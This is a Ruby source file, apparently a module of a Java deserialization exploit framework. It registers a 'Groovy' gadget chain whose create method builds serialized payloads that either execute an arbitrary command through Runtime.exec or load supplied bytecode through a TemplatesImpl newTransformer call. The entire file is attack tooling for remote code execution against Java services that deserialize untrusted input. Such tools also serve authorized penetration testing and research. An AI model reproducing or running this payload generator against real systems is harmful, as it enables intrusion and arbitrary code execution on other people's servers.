

require_relative '../payloads/groovy'
require_relative '../payloads/templates'

class Groovy < Java::Gadgets::Gadget
  def id
    'groovy'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('groovy')

    unless params.fetch('classfiles', nil).nil?
      return false unless Java::Serialize::Payloads::Templates.supported(ctx)
    end

    true
  end

  def targets
    %w[exec bytecode]
  end

  def create(ctx, params: {})
    ctx.reg.load('model/groovy.json')

    if !params.fetch('cmd', nil).nil?
      Java::Serialize::Payloads::Groovy.make_runtime_exec(params['cmd'])
    elsif !params.fetch('classfiles', nil).nil?
      tpl = Java::Serialize::Payloads::Templates.make_jdk(params['classfiles'])
      Java::Serialize::Payloads::Groovy.make_invoke_noarg(tpl, 'newTransformer')
    else
      raise 'Missing parameters'
    end
  end
end

Java::Gadgets.register(
  Groovy.new
)
